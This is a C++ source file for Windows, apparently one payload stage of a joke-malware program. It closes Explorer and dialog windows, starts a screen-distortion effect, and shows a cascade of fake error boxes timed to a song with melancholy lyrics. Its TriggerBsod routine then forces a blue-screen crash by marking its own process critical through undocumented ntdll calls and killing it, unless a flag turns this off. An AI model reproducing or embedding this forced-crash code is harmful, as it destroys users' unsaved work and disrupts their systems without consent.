#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <wchar.h>
#include <commctrl.h>
#include "../SongSync.h"
#include "../Wobble.h"
#include "../Flags.h"

#pragma comment(lib, "comctl32.lib")
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

extern void RestoreTitles();
extern void createError(const wchar_t* title, const wchar_t* text);
extern void SetErrorIcon(const wchar_t* type);
extern void PositionErrorTo(const wchar_t* pos);

static const int P7_DELAYS[109] = {
    224,   200,   209,   207,   456,
    201,   200,   233,   224,   216,
    216,   440,   216,   225,   216,
    216,   216,   207,   441,   224,
    216,   224,   216,   225,   216,
    432,   216,   231,   208,   200,
    240,   200,   441,   209,   215,
    225,   216,   216,   224,   423,
    216,   233,   200,   233,   224,
    233,   416,   216,   233,   209,
    224,   224,   216,   417,   216,
    224,   233,   207,   201,   224,
    425,   232,   207,   225,   200,
    216,   224,   425,   224,   232,
    224,   209,   207,   233,   432,
    216,   224,   225,   231,   209,
    224,   408,   233,   216,   209,
    231,   217,   224,   408,   240,
    208,   224,   216,   224,   192,
    441,   200,   240,   208,   216,
    233,   207,   473,   200,   233,
    207,   217,   200,   224
};

static const wchar_t* P7_WORDS[] = {
    L"so", L"sad", L"to", L"see", L"you", L"go", L"i", L"hope", L"you", L"have",
    L"a", L"nice", L"day", L"why", L"am", L"i", L"doing", L"this", L"but", L"i",
    L"dont", L"know", L"anything", L"i", L"miss", L"you", L"im", L"sorry", L"goodbye",
    L"my", L"friend", L"nothing", L"left", L"but", L"the", L"quiet", L"please",
    L"come", L"home", L"every", L"night", L"i", L"count", L"the", L"stars",
    L"dont", L"forget", L"me", L"i", L"wont", L"forget", L"so", L"lonely",
    L"so", L"still", L"so", L"tired", L"waiting", L"for", L"the", L"sun",
    L"that", L"never", L"comes", L"anymore", L"i", L"sit", L"here", L"counting",
    L"seconds", L"that", L"pass", L"like", L"days", L"the", L"longer", L"you",
    L"are", L"gone", L"the", L"more", L"i", L"remember", L"your", L"voice",
    L"in", L"the", L"hum", L"of", L"the", L"machine", L"sleep", L"is",
    L"just", L"a", L"shorter", L"version", L"of", L"waiting", L"maybe", L"you",
    L"never", L"meant", L"to", L"leave", L"maybe", L"i", L"never", L"said"
};
static const int P7_WORD_COUNT = (int)(sizeof(P7_WORDS) / sizeof(P7_WORDS[0]));

static const wchar_t* P7_TITLES[] = {
    L"sad", L"sadness", L"aaa", L"RIP", L"oops", L"no", L"why", L"huh",
    L"gone", L"bye", L"fever", L"tears", L"still", L"moment"
};
static const int P7_TITLE_COUNT = (int)(sizeof(P7_TITLES) / sizeof(P7_TITLES[0]));

static const wchar_t* P7_ICONS[] = {
    L"error", L"warning", L"error", L"error", L"warning", L"error"
};
static const int P7_ICON_COUNT = (int)(sizeof(P7_ICONS) / sizeof(P7_ICONS[0]));

typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pfnRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);

static void TriggerBsod() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) ntdll = LoadLibraryW(L"ntdll.dll");
    if (!ntdll) return;

    pfnRtlAdjustPrivilege RtlAdjustPrivilege =
        (pfnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    pfnRtlSetProcessIsCritical RtlSetProcessIsCritical =
        (pfnRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
    if (!RtlAdjustPrivilege || !RtlSetProcessIsCritical) return;

    BOOLEAN old = FALSE;
    RtlAdjustPrivilege(20, TRUE, FALSE, &old);
    RtlSetProcessIsCritical(TRUE, NULL, FALSE);
    TerminateProcess(GetCurrentProcess(), (UINT)STATUS_INTEGER_DIVIDE_BY_ZERO);
}

static BOOL CALLBACK ClearProc(HWND hwnd, LPARAM lp) {
    (void)lp;
    wchar_t cls[64];
    if (!GetClassNameW(hwnd, cls, 64)) return TRUE;

    if (_wcsicmp(cls, L"#32770") == 0) {
        SendMessageW(hwnd, TDM_CLICK_BUTTON, IDOK, 0);
        PostMessageW(hwnd, WM_CLOSE, 0, 0);
        return TRUE;
    }
    if (_wcsicmp(cls, L"errerFakeExplorer") == 0) {
        PostMessageW(hwnd, WM_CLOSE, 0, 0);
        return TRUE;
    }
    if (_wcsicmp(cls, L"CabinetWClass") == 0) {
        PostMessageW(hwnd, WM_CLOSE, 0, 0);
        return TRUE;
    }
    return TRUE;
}

static bool NoBsod() {
    return NoBsodFlag();
}

void runPayload7() {
    RestoreTitles();
    EnumWindows(ClearProc, 0);

    if (!NoGdiFlag()) {
        DWORD* wobMs = new DWORD(26972);
        HANDLE hWobble = CreateThread(NULL, 0, WobbleAmbientProc, wobMs, 0, NULL);
        if (hWobble) CloseHandle(hWobble);
    }

    bool anchored = false;
    DWORD base = SongSyncBase(182850, &anchored);
    SongSyncWait(base);

    srand((unsigned)GetTickCount() ^ 0x7B47);

    const int beatCount = (int)(sizeof(P7_DELAYS) / sizeof(P7_DELAYS[0]));
    DWORD acc = 0;
    for (int i = 0; i < beatCount; i++) {
        if (base) {
            DWORD target = base + acc;
            while ((LONG)(GetTickCount() - target) < 0) Sleep(5);
            if (i + 1 < beatCount) acc += (DWORD)P7_DELAYS[i];
        } else if (i > 0) {
            Sleep((DWORD)P7_DELAYS[i - 1]);
        }

        SetErrorIcon(P7_ICONS[i % P7_ICON_COUNT]);
        PositionErrorTo(L"cascade");
        createError(P7_TITLES[i % P7_TITLE_COUNT], P7_WORDS[i % P7_WORD_COUNT]);
    }

    Sleep(3000);
    if (!NoBsod()) TriggerBsod();

    TerminateProcess(GetCurrentProcess(), 0);
}